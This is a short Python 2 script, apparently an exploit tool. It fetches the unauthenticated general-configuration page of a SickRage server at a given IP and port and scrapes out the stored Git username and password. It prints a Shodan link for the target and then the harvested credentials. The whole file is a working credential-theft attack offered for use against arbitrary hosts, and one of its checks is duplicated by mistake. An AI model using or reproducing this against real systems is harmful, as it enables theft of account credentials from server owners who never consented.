import urllib3
import sys
import requests
from colorama import init, Fore
from BeautifulSoup import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
init(autoreset=True)

if __name__ == '__main__':
	if len(sys.argv) != 3:
		print "Usage: $ " + sys.argv[0] + " [IP_adress] [port]"
	else:
		host = sys.argv[1]
		print (Fore.MAGENTA + "https://www.shodan.io/host/{0}".format(host))
		port = sys.argv[2]
		print (Fore.MAGENTA + "*** Get User credentials from SickRage ***")
		url = "http://{0}:{1}/config/general".format(host, port)
		response = requests.get(url, timeout=5)
		parsed_html = BeautifulSoup(response.text)
		try:
			git_username = parsed_html.body.find('input', {'id': 'git_username'}).get("value")
			git_password = parsed_html.body.find('input', {'id': 'git_password'}).get("value")
			if str(git_password) != "None" and str(git_password) != "None":
				if len(git_password) >= 1 and len(git_username) >= 1:
					print (Fore.GREEN + str(git_username))
					print (Fore.GREEN + str(git_password))
		except AttributeError:
			pass